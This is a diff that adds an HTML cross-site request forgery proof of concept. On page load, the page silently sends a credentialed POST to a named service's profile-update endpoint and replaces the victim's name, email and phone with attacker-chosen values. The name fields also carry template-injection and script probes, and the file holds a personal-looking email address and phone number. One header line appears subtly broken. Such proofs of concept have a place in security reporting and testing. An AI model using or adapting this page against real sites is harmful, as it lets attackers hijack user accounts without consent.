@@ -1,0 +1,17 @@
+<html>
+  <body onload="submitRequest()">
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.justvps.com/user/profile/update", true);
+        xhr.setRequestHeader("x-csrf-token");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.withCredentials = true;
+        var data = JSON.stringify({"firstName":"{{3*3}}","lastName":"alert(2)","email":"noobhacker340@gmail.com","phone":"+6285960397700","address":"test"})
+        xhr.send(data);
+      }
+    </script>
+  </body>
+</html>
